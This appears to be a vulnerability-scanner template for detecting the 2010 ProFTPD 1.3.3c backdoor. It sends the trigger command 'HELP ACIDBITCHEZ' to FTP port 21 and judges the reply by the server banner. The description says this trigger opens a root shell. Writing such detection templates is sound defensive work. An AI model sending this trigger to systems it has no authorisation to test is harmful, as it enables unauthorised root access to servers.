id: CVE-2010-20103

info:
  name: ProFTPD 1.3.3c Backdoor - Command Injection
  author: intelligent-ears
  severity: critical
  description: |
    A backdoor was inserted into ProFTPD 1.3.3c between Nov 28 - Dec 2, 2010.
    Sending HELP ACIDBITCHEZ triggers a shell with root privileges.
  reference:
    - https://www.exploit-db.com/exploits/16921
    - https://nvd.nist.gov/vuln/detail/CVE-2010-20103
  classification:
    cve-id: CVE-2010-20103
    cwe-id: CWE-912
  tags: cve,cve2010,proftpd,rce,backdoor,network

network:
  - host:
      - "{{Hostname}}:21"
    
    inputs:
      - data: "HELP ACIDBITCHEZ\r\n"
    
    read-size: 1024
    
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "220 ProFTPD 1.3.3c"
      
      - type: word
        words:
          - "502 Unknown command"
        negative: true

    extractors:
      - type: regex
        regex:
          - "220 ProFTPD ([0-9.]+[a-z]?)"
